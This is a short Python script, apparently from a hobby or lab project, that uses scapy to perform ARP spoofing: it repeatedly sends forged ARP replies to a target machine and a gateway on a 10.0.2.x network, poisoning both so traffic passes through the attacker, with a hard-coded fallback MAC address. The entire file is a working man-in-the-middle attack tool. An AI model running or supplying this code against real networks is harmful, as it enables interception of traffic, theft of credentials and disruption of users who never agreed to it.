import time

import scapy.all as scapy

from getMac import get_mac

'''
    this method send the ARP packet to Source change the ARP of victim pc and send to destination 
'''


def spoof(target_ip, spoof_ip):
    try:
        mac = get_mac(target_ip)
    except IndexError:
        print("Does't find any Mac address, Default mac set")
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst="28:56:5a:90:4d:f5", psrc=spoof_ip)
        scapy.send(packet)

    else:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
        scapy.send(packet)


if __name__ == "__main__":
    while True:
        spoof("10.0.2.15", "10.0.2.1", )
        spoof("10.0.2.1", "10.0.2.15")
        time.sleep(2)
